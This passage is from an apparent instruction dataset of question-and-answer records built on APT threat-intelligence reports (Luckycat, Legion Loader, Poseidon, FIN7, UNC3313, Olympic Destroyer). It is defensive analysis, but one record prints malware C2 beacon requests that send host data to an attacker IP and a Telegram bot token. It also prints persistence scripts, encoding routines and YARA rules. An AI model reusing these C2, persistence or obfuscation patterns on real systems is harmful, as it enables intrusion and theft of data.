CONCLUSION\nTargeted attacks have been extremely successful, making the scope of the problem truly global. These have been affecting governments, militaries, defense industries, high-technology companies, intergovernmental organizations, nongovernmental organizations (NGOs), media organizations, academic institutions, and activists worldwide.\nTargeted attacks are not isolated smash-and-grab incidents. They are part of consistent campaigns that aim to establish persistent, covert presence in a target's network so that information can be extracted as needed.\nTargeted attacks may not be easy to understand but careful monitoring allows researchers to leverage the mistakes attackers make to get a glimpse inside their operations. Moreover, we can track cyber-espionage campaigns over time using a combination of technical and contextual indicators.\nThis paper specifically discussed the Luckycat campaign. In the course of our research, we discovered that it had a much more diverse target set than previously thought. Not only did the attackers target military research institutions in India, as earlier disclosed by Symantec, they also targeted sensitive entities in Japan and India as well as Tibetan activists. They used a diversity of infrastructure as well, ranging from throw-away free-hosting sites to dedicated VPSs.\nWe also found that the Luckycat campaign can be linked to other campaigns as well. The people behind it used or provided infrastructure for other campaigns that have also been linked to past targeted attacks such as the previously documented ShadowNet campaign.19\nUnderstanding the attack tools, techniques, and infrastructure used in the Luckycat campaign as well as how an individual incident is related to a broader campaign provides the context necessary for us to assess its impact and come up with defensive strategies in order to protect our customers.\nBig Headline: DEFENDING AGAINST APTS\nSufficiently motivated threat actors can penetrate even networks that use moderately advanced security measures. As such, apart from standard and relevant attack prevention measures and mechanisms such as solid patch management; endpoint and network security; firewall use; and the like, enterprises should also focus on detecting and mitigating attacks. Moreover, data loss prevention (DLP) strategies such as identifying exactly what an organization is protecting and taking into account the context of data use should be employed.\nMedium Headline: local anD external threat intelligence\nThreat intelligence refers to indicators that can be used to identify the tools, tactics, and procedures threat actors engaging in targeted attacks utilize. Both external and local threat intelligence is crucial for developing the ability to detect attacks early. The following are the core components of this defense strategy:\n\u2022 Enhanced visibility: Logs from endpoint, server, and network monitoring are an important and often underused resource that can be aggregated to provide a view of the activities within an organization that can be processed for anomalous behaviors that can indicate a targeted attack.\n\u2022 Integrity checks: In order to maintain persistence, malware will make modifications to the file system and registry. Monitoring such changes can indicate the presence of malware.\n\u2022 Empowering the human analyst: Humans are best positioned to identify anomalous behaviors when presented with a view of aggregated logs from across a network. This information is used in conjunction with custom alerts based on the local and external threat intelligence available.\n19\nTechnologies available today such as Deep Discovery provide visibility, insight, and control over networks to defend against targeted threats.20 Deep Discovery uniquely detects and identifies evasive threats in real time and provides in-depth analysis and actionable intelligence to prevent, discover, and reduce risks.\nMedium Headline: Mitigation anD cleanup strategy\nOnce an attack is identified, the cleanup strategy should focus on the following objectives:\n\u2022 Determine the attack vector and cut off communications with the C&C server.\n\u2022 Determine the scope of the compromise.\n\u2022 Assess the damage by analyzing the data and forensic artifacts available on compromised machines.\nRemediation should be applied soon afterward, which includes steps to fortify affected servers, machines, or devices into secure states, informed in part by how the compromised machines were infiltrated.\neDucating eMployees against social\nengineering\nSecurity-related policies and procedures combined with education and training programs are essential components of defense. Traditional training methods can be fortified by simulations and exercises using real spear-phishing attempts sent to test employees. Employees trained to expect targeted attacks are better positioned to report potential threats and constitute an important source of threat intelligence.\nMedium Headline: Data-centric protection strategy\nThe ultimate objective of targeted attacks is to acquire sensitive data. As such, DLP strategies that focus on identifying and protecting confidential information are critical. Enhanced data protection and visibility across an enterprise provides the ability to control access to sensitive data as well as monitor and log successful and unsuccessful attempts to access it. Enhanced access control and logging capabilities allow security analysts to locate and investigate anomalies, respond to incidents, and initiate remediation strategies and damage assessment.\n20\nMedium Headline: TREND MICRO\u2122\nTrend Micro Incorporated (TYO: 4704; TSE: 4704), a global cloud security leader, creates a world safe for exchanging digital information with its Internet content security and threat management solutions for businesses and consumers. A pioneer in server security with over 20 years' experience, we deliver top-ranked client, server and cloud-based security that fits our customers' and partners' needs, stops new threats faster, and protects data in physical, virtualized and cloud environments. Powered by the industry-leading Trend Micro\u2122 Smart Protection Network\u2122 cloud computing security infrastructure, our products and services stop threats where they emerge\u2014from the Internet. They are supported by 1,000+ threat intelligence experts around the globe.\nBig Headline: Operations\nThe 1st-stage computer intrusions often use social engineering. Attackers custom-fit attacks to their targets.\n\u00bb Targeted emails that are contextually relevant (i.e., emails containing a decoy document of radiation dose measurement results sent some time after the Great East Japan Earthquake)\n\u00bb Exploited CVE-2010-3333 (aka, Rich Text Format [RTF] Stack Buffer Overflow Vulnerability) in several instances, although Adobe Reader and Flash Player vulnerabilities were also exploited\n\u00bb Used TROJ_WIMMIE or VBS_WIMMIE\u2014malware that take advantage of the Windows Management Instrumentation (WMI), making the backdoor component undetectable through file scanning\n\u00bb The WIMMIE malware, once inside the network, connects to a command-and-control (C&C) server via HTTP over port 80\n\u00bb Attackers heavily used free web-hosting services to host their C&C servers under a diverse set of domain names but also used virtual private servers (VPSs) for more stable operations\n\nWhat specific information does the Comfoo malware gather from infected systems, and why is this significant for the attackers?",
    "output": "The Comfoo malware gathers a wide range of information from infected systems, including CPU, NETBIOS, and disk information; system, OS version, and account information; network adapters, protocols, and configuration information; installed applications as well as Internet Explorer (IE) and Browser Helper Object (BHO) information. This information is significant for the attackers because it provides them with a comprehensive understanding of the target's environment, enabling them to tailor further attacks, move laterally within the network, and extract sensitive data more effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: The RDP Backdoor\nAnother interesting malware we saw deployed by Legion Loader is an RDP-based backdoor. The backdoor, which arrives in the form of an NSIS installer, employs an embedded blowfish .DLL to decrypt strings which form a cmd.exe command which executes a very large embedded PowerShell script entitled \"premiumlegitJFSQZPTTEU\":\nThe embedded \"premiumlegitJFSQZPTTEU\" script contains a very large DES encrypted blob which is decrypted and executed:\nThe decrypted code, which employs a code borrowed from Invoke-PsUACme \u2013 a PowerShell module intended for UAC bypass, contains several gzip-compressed, base64 encoded blobs:\nCaption: \"$DllBytes32/64\" variables containing UACme .DLLs which are used in order to bypass UAC.\nCaption: gzip-compressed, base64 encoded blobs. \"$rdp\" blob is empty in this example.\" $vmt\", \"$clip\" and \"$cfg\" blobs contain various ancillaries which are required in order to set up the RDP backdoor. \"$bot\" \"$bot64\" and \"$rdp64\" are the malicious payloads.\nThese blobs are decoded and decompressed using a set of contained functions and are deployed by the PowerShell code to %programfiles%/windows mail/appcache.xml or %/default_list.xml, based on the executing machine's operating system. While the written file's extension is .xml they are actually .DLL files.\nCaption: contained function \"react\" is called to deploy the blob.\nAfter the required .DLL containing blob has been deployed, it is registered as a system service:\nSmall Headline: Legion Loader Samples (SHA256)\n04682cf5670dfd8095d1fc9da7ff89f939c73a16c4ebe52dbff7afe5f1a8b89f 04cc0ee8b070e54522aa198b72b12498f338795b73ab2505004000b7566474df 08f5c172493ddbec42574914f6b504553029a56bf45b137b319f669348081abe 14d49f41892c667d0984db2809894c6d83c4d3c1cc78f1b81c5dc37a0f8c9c1c 1692b57a111f0269f3660cfddc50ff0e6187c79f73ee3cdcd4f337758e9b40ea 1a8076c2b19d84177f2fc06c3ad712794f5276b221c08dc1545e8f8cd3bbdd2a 1f7f9e40009e8fb16713a2d24039139d7ef910ce8d12b19df16172d01eb6110b 220fc8e1c518c7e51b03269a32cabdd18197ea449d57880fb4c45afebbd15971 2335f67565efe39a2fffd77a7c97996401847620a03091ef328505b8f07b0899 261c1a6e120970efc587047be377fee2ca77884b5c7db4cc3849b6adff340d82 262f5901d5463b9d191893b4873cd9e88d3c87f43e91d1f984d956167c063041 2891b08c134238beeb08582e3465d77c0fff2ac4bf2cd67162b7402b7246ace4 28c16cd88f6453a856690e5e2de96c656c404703361c7a9dfed804ec45dd4391 2b61b3b00aa5d548e41dc305cb1271c26dc387601a7a7cdb63600b49c270bb30 2c5266c1053b343bcbd38d7bbfbf4a3b0be3d40b8f57320bed91b5ac26dacf30 2e3fac6fde0e4ea23a1ac808dc11986f62be096971759a36e64b846feb9ddaf9 2f1cb5d0c60b2ab9034ad7ae1ec79e28ddfa5628a90323a013e6285337368dcd 3080858d67dfa757fd27fa4dc3cfd521a8308b8698eeec6fb599fefd7903ef76 32467a0067ea899b925eca0f449f9751973cf1927f7f53df9ef07fa41745bdd1 3933da33446b776c22ea0e84b7cc3e93a122be7960985231027a3be80a068759 3d7442d4210e1422631fb89a19c29f74c75b1bbd8a1355067f8b6d53df8e4e97 40ebd67ff8278c9efc6aa90e9bd4221ed9155369c90ba25bfe699c2d418f6610\n44a7a3f09fec710bf5ce94ae0c1ebf5a1b474d247049cbe5acde33f444ab95c1 474148a9521885361308d9c664ccbfbf523e02d61ee513bdb43e7c94db35eded 477c9070a41e27c715c1edfc75983b08bbd38eed5dbe592e335a59def8805b82 5150c5a557815359e3533781ae58d1c9f270a2f5cfe6353a1a09acb2b651e8d6 54a32aca91c9e377199ac9741b224d5ee09dc4ac67f6177bb4e9f336e5d178b2 62f73e351671b9b17a68f2658a88b810f6595a02e9ef2e55d06fd6fee05932ec 656b988e1b01eb39066d8d91dd5e64b96b75780c5bfb2edad4a9dec21258b01a 6870cd48b741e51187032fb0e3b29171c753cdf781e7585407a900853818bd9a 68ce4c27840a78ddd5d8203d351a2d8951cbe3fc124d8eee4eb9507df9b23355 696985a0b8af5dc318af712c410410c86df46eac80aa15b65e1b9d7a6801b0d6 6a7db2d291545ef2963cc9479406cf412f12d2ffaeed01bf48da7c3f0aa5206c 7308bed122bfdf2e57efa5eabb8191e0d04325d068a9ef731c157df24bb2c053 78d8dc01174f2d53c44b7a560f7ab532c0744136ffa6d9f6e30a09268e4d6214 7bbfeeeaed4234253b93ccd0fee869acbcb3be9cb1619e62e7375c5d072872cf 7f0cfe19a278dcfe60edb4a0b6edf898cf8fabfeda5d24c5bc16ae682c62212a 815fc066119f0ee3e387d4afeade832f43ab67321146258a8cbcddf175089bb3 8272ac4b57a686dea7f56f20703d9be056b2cf2c715e8d9ed475a9f0317acf15 8a213d1ce71dd072d6bbab31fcffdddcef285fe7dbfc04f41b60ad68056f8a95 8d6a289bd8f37b89194948bb1b111660015b7ef59dd3a6956c2ac13f0834b4a8 9443f6eb45bb7531660edc1298dad119a9f3ff117916a9b507dbd5ad568f1598 a880c587076db516f296b727e40c330527f7a2b07c4892f901b372cb2f248fe8 aa5d4c43d1849292d2a89fd32d8ebd8a966a6859a55596563b6dd2e7a3215c18 b80edd66f1e9a3cb3485c311e38b5f419d93c04bcc36d3040f2fc34850fea81c b8c19a4291da50c31ebd6e3eae610440746caa11863229dce9c47c1dc1b56ec8\nbd61ebe590f41655fccfc5edb3f02a62a8ad3cbc0da709a34897a2cf4660dd1f c05d37f585b14c6293d7fb2cde9d96abc2ea9ee4c201cdf81a13bb35e0eee3fb c2fda41eb7326569ada6c4d739ac95ce68092dbf22a28ec8a4eb1751f42f8d9a c3608a8a066986e6881e164051813e1294952eb4eb8beddd2d67880586a00e62 c762b04e5c4f20fe1f0f179e031916e7f91419a8153fc236399430a28955879b ccf6d1b7d47d8357f30411b81b6fb088bd2fb475b28019995889c746f44144b0 d1a5131b0194a2e004fa82a8531548c8b880efd619b7ffe220a132b732878590 d4f2e466297be77e0f8efee83099f3e782877a1cba72c292cfd93d07f760dd5a d536cb602c3bb7ea7bdb70b6a4539ddbbe09ebd374b8bb3e501f6b8ba55af263 d730cc79aa420aa40b17b473ba7630cfbeda2ed8e9545bbbeb9057f208872b18 de0a08996532e8ae19dfcff3f2c2d18a3a54e904cda8c655c6d233afc7eecd12 e2b81bf2379dc693f82312026b420c45b4f3ea914b1272818e990af05d060645 e497bd74a134b10d6bd5385cd59fe4c60758bc5135c970422cb868e6f801ce02 e7bd5233b7284b50cdc40e9f3105d10aca695e5787dece60dfe6a4ffc4f77923 ed459c57355792778c4682671ee2df6e52d1f08ddfc2decab57179346f879eae f1c3649e5f680ba76643e0a83d2769bd55a2933b02ead9020556caf96af26c85 f3806426cc766cc99364e636aaded2933317459ebb78098e27d37203b3f1753d f381e639ebf723b8aea5238545c5b069e59d1c3ea9852dd835f9e783082d1576 f79e1578923cf520bee1183607c65c12a390498f6faea7d3af1d79af6fea26e1 f88a7a17b516505edc21c52756afa1302a3dd03402bf0006ada6472f76d540aa fcc5a956c6a26326d2ef51aa71f9996dc7e5003f332f24619464c5187b3008c2\n\nQuestion: How does the RDP-based backdoor deployed by Legion Loader utilize encryption and obfuscation techniques to evade detection?\n\nAnswer:",
    "output": "The RDP-based backdoor deployed by Legion Loader employs several layers of encryption and obfuscation to evade detection. First, it arrives in the form of an NSIS installer and uses an embedded Blowfish .DLL to decrypt strings, forming a cmd.exe command that executes a large embedded PowerShell script named 'premiumlegitJFSQZPTTEU'. This script contains a DES-encrypted blob, which is decrypted and executed. The decrypted code borrows from Invoke-PsUACme, a PowerShell module for UAC bypass, and includes several gzip-compressed, base64-encoded blobs. These blobs contain UACme .DLLs, ancillary components for setting up the RDP backdoor, and the actual malicious payloads. They are decoded and decompressed using contained functions and deployed to specific locations on the system, disguised as .xml files but actually being .DLL files. Finally, the deployed .DLL is registered as a system service to ensure persistence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Is the command and control server used by the Poseidon Group still active? Have you been able to sinkhole any of the command and controls?\nPoseidon Group has interesting practices when it comes to its use of command and control servers, including redundancies and quickly discarding command and control (C&Cs) servers after specific campaigns. This has actually allowed us to sinkhole several domains. A few of these still had active infections attempting to report to the C&Cs. This adds an interesting dimension to the story. As part of Kaspersky Lab's commitment to securing cyberspace for everyone, we reached out and notified identifiable victims, regardless of their security solution and provided them with indicators of compromise (IOCs) to help root out the active infection. In the process, we were able to confirm the previously described operating procedures for the Poseidon Group.\nBig Headline: Is this a state\u00adsponsored attack? Who is responsible?\nWe do not believe this to be a state\u00adsponsored attack but rather a commercial threat player. Collaboration with information\u00adsharing partners and victim institutions allowed us to become aware of the more complicated business cycle involved in this story, greatly adding to our research interest in tracking these campaigns. The malware is designed to function specifically on English and Portuguese\u00adlanguage systems. This is the first ever Portuguese\u00adspeaking targeted attack campaign.\nBig Headline: How long have the attackers been active?\nThe attackers have been active for more than ten years. The main distribution of samples goes back to 2005 with possible earlier outliers.\nOperating systems such as Windows 95 for desktop computers and Windows NT for server editions were not uncommon at the time and Poseidon's team has evolved gradually into targeting the latest flagship editions of Microsoft's operating systems. Recent samples show interest in Windows 2012 Server and Windows 8.1.\nBig Headline: Did the attackers use any interesting/advanced technologies?\nDuring a particular campaign, conventional Poseidon samples were directed to IPs resolving to satellite uplinks. The networks abused were designed for internet communications with ships at sea which span a greater geographical area at nearly global scale, while providing nearly no security for their downlinks.\nThe malware authors also possess an interesting understanding of execution policies which they leverage to manipulate their victim systems. They combine reconnaissance of GPO (Group Policy Object management for execution) with digitally\u00adsigned malware to avoid detection or blocking during their infection phases. These digital certificates are often issued in the name of rogue and legitimate companies to avoid arousing suspicion from researchers and incident responders.\nBig Headline: How many victims have you found?\nAt least 35 victim companies have been identified with primary targets including financial and government institutions, telecommunications, manufacturing, energy and other service utility companies, as well as media and public relations firms.\nThe archaeological effort of understanding such a long\u00adstanding group can severely complicate victim identification. We see traces of upwards of a few tens of companies targeted. The exact number of the victims may actually vary. Since it is a very long term group, some victims may be impossible to identify now.\nAt this time, we are reaching out to victims of active infections to offer remediation assistance, IOCs, and our full intelligence report to help them counteract this threat. Any victims or potential targets concerned about this threat should please contact us at .\n\nHow does the Poseidon Group manage its command and control (C&C) servers, and what strategies did Kaspersky Lab employ to mitigate the threat posed by these servers?",
    "output": "A: The Poseidon Group employs redundancies and quickly discards C&C servers after specific campaigns. This practice allowed Kaspersky Lab to sinkhole several domains, some of which still had active infections attempting to report to the C&Cs. As part of their commitment to securing cyberspace, Kaspersky Lab notified identifiable victims, regardless of their security solutions, and provided them with indicators of compromise (IOCs) to help root out active infections. This process confirmed the operating procedures of the Poseidon Group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Key Findings\nAnomali Threat Research discovered six malicious Windows 11 Alpha-themed Word documents with Visual Basic macros being used to drop JavaScript payloads, including a Javascript backdoor.\nWhile we cannot conclusively identify the attack vector for this activity, our analysis. strongly suggests the attack vector was an email phishing or spearphishing campaign.\nWe assess with moderate confidence that the financially motivated threat group FIN7 is responsible for this campaign.\nBased on the file names observed in this campaign, the activity likely took place around late-June to late-July 2021.\n\nHow does the use of Visual Basic macros in the Windows 11 Alpha-themed Word documents facilitate the delivery of JavaScript payloads, and what implications does this have for cybersecurity defenses against the FIN7 threat group?",
    "output": "The use of Visual Basic macros in the Windows 11 Alpha-themed Word documents allows for the execution of embedded scripts when the document is opened. These macros are designed to drop JavaScript payloads, which can include a JavaScript backdoor. This method is effective because it leverages common office software functionality to deliver malicious code. For cybersecurity defenses, this highlights the importance of disabling macros by default and educating users about the risks associated with enabling macros from untrusted sources. Additionally, it underscores the need for robust endpoint detection and response systems that can identify and mitigate the execution of malicious scripts. The attribution of this campaign to the financially motivated threat group FIN7 emphasizes the sophistication and adaptability of advanced persistent threats, requiring continuous vigilance and proactive defense strategies.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: Figure 21: NSIS Script Snippet for STARWHALE.GO\nThe following registry key is created as a result of running the NSIS executable.\nKEY: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookM\nValue: C:\\Users\\<redacted>\\AppData\\Local\\OutlookM\\index.exe\nFigure 22: STARWHALE.GO Persistence Method\nSTARWHALE.GO also uses a custom data encoding algorithm to protect its network communication and critical strings within the binary. It sends the same information as STARWHALE, but the data sent and received are a JSON object. A sample HTTP POST request is shown in Figure 23.\nPOST /nnskfepmasiiohvijcdpxtxzjv HTTP/1.1\nHost: 87.236.212[.]184\nUser-Agent: Go-http-client/1.1\nContent-Length: 91\nContent-Type: application/json\nAccept-Encoding: gzip\n{\"vl\":\"2179526e3176587ec7557e4192495c46264556569c47693e8d39415432445722222733323323332333\"}\nSmall Headline: Figure 23: STARWHALE.GO HTTP C2 beacon\nSTARWHALE.GO uses a different delimiter \"|&&%&&|\" than STARWHALE, but the rest of the enumerated information sent to the hardcoded C2 IP address is the same. Similarly, the malware reads the response from the POST request to the C2 server and attempts to decode it using the same custom string transformation routine it used to encode the data it sent. This routine is simpler than that used by STARWHALE, as explained later. The decoded result is either launched as a command line with the process \"cmd.exe /c\" or launched directly as a process if the string ends with .com, .exe, .bat, or .cmd. The output of the launched process, or error message in the case of a failure to decode the string, is sent to the C2 server via HTTP POST requests to its C2 server at hxxp://87.236.212[.]184/cepopggawztuxkxujfjbnpv.\nMandiant identified a third UNC3313 backdoor during the investigation that was compiled with Python 3.9 and packaged via PyInstaller, which would only execute on Windows 8 and higher. Mandiant has named this backdoor GRAMDOOR due to its ability to use the Telegram Bot API for communication. It sends and receives messages from an actor-created Telegram chat room. GRAMDOOR arrives on the system packaged as an NSIS installer, which establishes a persistence mechanism by setting the Windows Run registry key, as shown in Figure 24.\nKEY: HKEY_USERS\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMicrosift\nValue: C:\\Users\\<redacted>\\AppData\\Roaming\\OutlookMicrosift\\index.exe\" Platypus\nSmall Headline: Figure 24: GRAMDOOR Persistence Method\nThe NSIS installer for GRAMDOOR drops the PyInstaller packaged binary in the APPDATA directory in a subdirectory named OutlookMicrosift. It is executed using Exec command from the install directory, as shown in Figure 25.\nInstType $(LSTR_37)  ;  Custom\nInstallDir $APPDATA\\OutlookMicrosift\n; install_directory_auto_append = OutlookMicrosift\n; wininit = $WINDIR\\wininit.ini\n; --------------------\n; SECTIONS: 1\n; COMMANDS: 6\nSection ; Section_0\n; AddSize 16859\nCreateDirectory $INSTDIR\nSetOutPath $INSTDIR\nFile index.exe\nExec \"$INSTDIR\\index.exe Platypus\"\nWriteRegStr HKCU SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run OutlookMicrosift \"$\\\"$INSTDIR\\index.exe$\\\" Platypus\"\nSectionEnd\nSmall Headline: Figure 25: NSIS Script Snippet for GRAMDOOR\nGRAMDOOR expects to be launched with one command-line parameter, which in this case was \"Platypus.\" It uses this command-line parameter to piece together the function name, which is then called and acts as the entry point to the malware. GRAMDOOR implements only two commands: start and com. These commands are used to launch a cmd.exe process to which commands are piped. All network communication is via the Telegram server at api.telegram[.]org. This allows the actors to disguise their communication as regular Telegram traffic. This technique is not novel, and it is not the first time Iranian actors abused (<https://securityintelligence.com/posts/nation-state-threat-group-targets-airline-aclip-backdoor/>)publicly available software to make their C2 traffic blend in.\nAll HTTP requests from the malware to the Telegram server contained the token string 2003026094:AAGoitvpcx3SFZ2_6YzIs4La_kyDF1PbXrY. The token strings are used to authenticate to the bot. Figure 26 shows a sample request.\nhxxps://api.telegram[.]org/bot2003026094:AAGoitvpcx3SFZ2_6YzIs4La_kyDF1PbXrY/sendMessage? chat_id=<chat_id>&parse_mode=Markdown&text=<content>\nSmall Headline: Figure 26: GRAMDOOR Sample Request\nThe malware uses the sendMessage API function to send information to a chat ID number. The actors interact with the host via the chat by issuing commands and then getting output of the executed commands sent back in the chat. For example, to retrieve network configuration information from the infected host, the attacker would issue the command \"com<id> c607666261766066f9f23ec696\" where the value \"c607666261766066f9f23ec696\" is translated to \"ipconfig /all\" command.\nSTARWHALE and GRAMDOOR share similarities in logic for the custom encoding scheme used for the data and commands sent to and received from the C2. The following code snippet demonstrates STARWHALE's traffic encoding and decoding and GRAMDOOR's commands passed back and forth between Telegram chat messages.\ndef transform_chars(data):\ndata = list(data)\nsrc = 0\ndst = len(data) - 1\nwhile src < dst:\nt = data[src]\ndata[src] = data[dst]\ndata[dst] = t\nsrc += 3\ndst -= 2\nreturn ''.join(data)\ndef decode_traffic(data):\nreturn bytes.fromhex(transform_chars(transform_chars(data)[::-1])).decode('utf')\ndef encode_traffic(data):\nreturn transform_chars(transform_chars(data.encode('utf').hex())[::-1])\nFigure 27: Encoding/Decoding custom routine example code snippet\nGRAMDOOR also hides sensitive strings within its code using a custom XOR-based encryption scheme. The following sample code shows the logic of the aforementioned scheme.\ndef xor_transform(data):     key = '`qLd' + str(5) + 'Hm^yw/sG-qh&@~y|[dJmC' + str(6) + 'UFvNt-^^_FeSd' + str(4) + 'N*#GNophwQ-MCJ' + str(1) + '?>L73PY'     return ''.join((lambda .0: [ chr(ord(c1) ^ ord(c2)) for c1, c2 in .0 ])(zip(data, key)))\ndef encode_str(data):\nreturn base64.b64encode(xor_transform(data).encode())\ndef decode_str(data):     return xor_transform(base64.b64decode(data).decode())\nFigure 28: Sample snippet showing XOR-based encryption scheme used in GRAMDOOR\nMandiant also observed UNC3313 store PowerShell downloader commands in Registry keys that were referenced by a Scheduled Task named \"Oracle scheduled assistant Autoupdate\" that is triggered on user logon.\nPath: HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Oracle\\Pre\nType: REG_SZ\nValue Name: Pre\nText: IEX\nSmall Headline: Figure 30: PowerShell command stored in Registry Value \"Post\"\nLastly, Mandiant observed UNC3313 download and execute a Windows Installer file for the eHorus remote access tool from the vendor website. UNC3313 executed the file ehorus_installer_windows-1.1.3-x64_enUS.msi, which created a service named EHORUSAGENT. The eHorus agent process ehorus_agent.exe communicates with domains hosted on ehorus[.]com.\nLog: System\nSource: Service Control Manager\nEID: 7045\nService Name: eHorus Agent Launcher\nService File Name:  \"C:\\Program Files\\ehorus_agent\\ehorus_launcher.exe\" -s\nBig Headline: YARA Rules\nrule M_Hunting_Backdoor_STARWHALE_1\n{\nmeta:\nauthor = \"Mandiant\"\ndescription = \"Detects strings for STARWHALE samples\"\nmd5 = \" cb84c6b5816504c993c33360aeec4705\"\nrev = 1\nstrings:\n$s1 = \"JSCript\" ascii nocase wide\n$s2 = \"VBSCript\" ascii nocase wide\n$s3 = \"WScript.Shell\" ascii nocase wide\n$s4 = \"ok\" ascii nocase wide\n$s5 = \"no\" ascii nocase wide\n$s6 = \"stari.txt\" ascii nocase wide\n$s7 = \"SoRRy\" ascii wide\n$s8 = \"EMIP\" ascii wide\n$s9 = \"NIp\" ascii wide\n$s10 = \"401\" ascii wide\n$s11 = \"_!#\" ascii wide\n$s12 = \"/!&^^&!/\" ascii wide\n$s13 = \"|!)!)!|\" ascii wide\n$s14 = \"|#@*@#|\" ascii wide\n$s15 = \"/!*##*!/\" ascii wide\n$s16 = \"sory\" ascii nocase wide\ncondition:\nfilesize > 5KB and filesize < 5MB and 10 of ($s*)\n}\nmeta:\ndescription = \"Detects strings for STARWHALE.GO\"\nstrings:\n$main1 = \"main.findExecutable\" ascii\n$main2 = \"main.showMatrixElements\" ascii\n$delim = \"|&&%&&|\" ascii\n$matrix = \"MATRIX1*MATRIX2\" ascii\n$sample = \"1522526f4260f4653664276774\" ascii\ncondition:        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 15MB and 4 of them\n}\nBig Headline: Acknowledgements\nSpecial thanks to Mike Hunoff, Nick Harbour, and Muhammad Umair for their assistance with reverse engineering the malware discussed in this blog post, and Adrien Bataille and Ervin James Ocampo for creating detections for malware families. Additionally, we would also like to thank Dan Andreiana, Alexander Pennino, Nick Richards, Jake Nicastro, Sarah Jones, and Geoff Ackerman for their help with technical review and providing valuable feedback.\n\nQuestion: How does GRAMDOOR leverage the Telegram Bot API for command and control (C2) communication, and what are the advantages of this approach?\n\nAnswer:",
    "output": "GRAMDOOR uses the Telegram Bot API to send and receive messages from an actor-created Telegram chat room. It communicates with the Telegram server at api.telegram[.]org, disguising its C2 traffic as regular Telegram traffic. The malware uses the sendMessage API function to send information to a chat ID number and interacts with the host via the chat by issuing commands and receiving output. This approach allows the actors to blend their C2 traffic with legitimate Telegram traffic, making it harder to detect and block. Additionally, it provides a robust and scalable communication channel that leverages existing infrastructure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nOlympic Destroyer is still alive\nBy GReAT\nIn March 2018 we published , an advanced threat actor that hit organizers, suppliers and partners of the Winter Olympic Games 2018 held in Pyeongchang, South Korea. Olympic Destroyer was a cyber-sabotage attack based on the spread of a destructive network worm. The sabotage stage was preceded by reconnaissance and infiltration into target networks to select the best launchpad for the self-replicating and self-modifying destructive malware.\nWe have previously emphasized that the story of Olympic Destroyer is different to that of other threat actors because the whole attack was a masterful operation in deception. Despite that, the attackers made serious mistakes, which helped us to spot and prove the forgery of rare attribution artefacts. The attackers behind Olympic Destroyer forged automatically generated signatures, known as Rich Header, to make it look like the malware was produced by Lazarus APT, an actor widely believed to be associated with North Korea. If this is new to the reader, we recommend dedicated to the analysis of this forgery.\nThe deceptive behavior of Olympic Destroyer, and its excessive use of various false flags, which tricked many researchers in the infosecurity industry, got our attention. Based on malware similarity, the Olympic Destroyer malware was linked by other researchers to three Chinese speaking APT actors and the allegedly North Korean Lazarus APT; some code had hints of the EternalRomance exploit, while other code was similar to the Netya () and targeted ransomware. Kaspersky Lab managed to find lateral movement tools and initial infection backdoors, and has followed the infrastructure used to control Olympic Destroyer in one of its South Korean victims.\nSome of the TTPs and operational security used by Olympic Destroyer bear a certain resemblance to . When it comes to false flags, mimicking TTPs is much harder than tampering with technical artefacts. It implies a deep knowledge of how the actor being mimicked operates as well as operational adaptation to these new TTPs. However, it is important to remember that Olympic Destroyer can be considered a master in the use of false flags: for now we assess that connection with low to moderate confidence. We decided to keep tracking the group and set our virtual 'nets' to catch Olympic Destroyer again if it showed up with a similar arsenal. To our surprise it has recently resurfaced with new activity.\nIn May-June 2018 we discovered new spear-phishing documents that closely resembled weaponized documents used by Olympic Destroyer in the past. This and other TTPs led us to believe that we were looking at the same actor again. However, this time the attacker has new targets. According to our telemetry and the characteristics of the analyzed spear-phishing documents, we believe the attackers behind Olympic Destroyer are now targeting financial\norganizations in Russia, and biological and chemical threat prevention laboratories in Europe and Ukraine. They continue to use a non-binary executable infection vector and obfuscated scripts to evade detection.\n\nWhy did the attackers behind Olympic Destroyer forge Rich Header signatures to make the malware appear as though it was created by the Lazarus APT? What implications does this have for cybersecurity professionals in identifying and attributing cyber attacks?",
    "output": "The attackers behind Olympic Destroyer forged Rich Header signatures to create a false attribution, making it seem like the malware was produced by the Lazarus APT, an actor widely believed to be associated with North Korea. This deceptive tactic aimed to mislead investigators and complicate the attribution process. For cybersecurity professionals, this highlights the importance of not relying solely on technical artifacts for attribution. Instead, they need to consider a broader range of factors, including tactics, techniques, and procedures (TTPs), to accurately identify the true perpetrators of an attack. This approach helps in avoiding false positives and ensures a more thorough investigation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 3.6. Technical Analysis: aax.me Antivirus Profiling\nInterestingly, aax.me also attempts to determine the presence of various antivirus products on a target's machine.\nWe expand on the probing of antivirus programs which we observed on aax.me, as we were unfamiliar with this technique. The technique appears to work on any modern version of Windows, with the latest versions of Chrome, Firefox, and IE/Edge (though, the profiling script excludes IE versions less than IE9 from the profiling, using the vertical tab test). Specifically, 31 the script conducts GET XMLHttpRequests (one at a time) to 127.0.0.1/ on the following ports: 12993, 44080, 24961, 1110, 6646, 6999, 30606. The script stops conducting these requests if it finds one request whose readyState is set to 4 less than 20ms after the request was initiated (200ms for port 6646), and submits the number of this port to the server.\nThe latest versions of Internet Explorer/Edge, Chrome, and Firefox (except Tor Browser) will all perform these XMLHttpRequests to 127.0.0.1 on behalf of any site. Of course, the result of such a request will most likely not be available to the script, due to the same-origin policy, and likely absence of a CORS 32 header in the response. Indeed, the script does not attempt to read the results of its requests. Rather, it leverages the fact that the web browser makes the status of the request sent available, via the readyState parameter of an XMLHttpRequest instance (1 approximately represents TCP SYN sent, and 4 represents HTTP response received or TCP connection terminated). For a closed port, Windows will issue an RST/ACK for each SYN sent. However, it appears that Windows' TCP stack will not consider an outgoing connection it is initiating to be terminated until it has sent 3 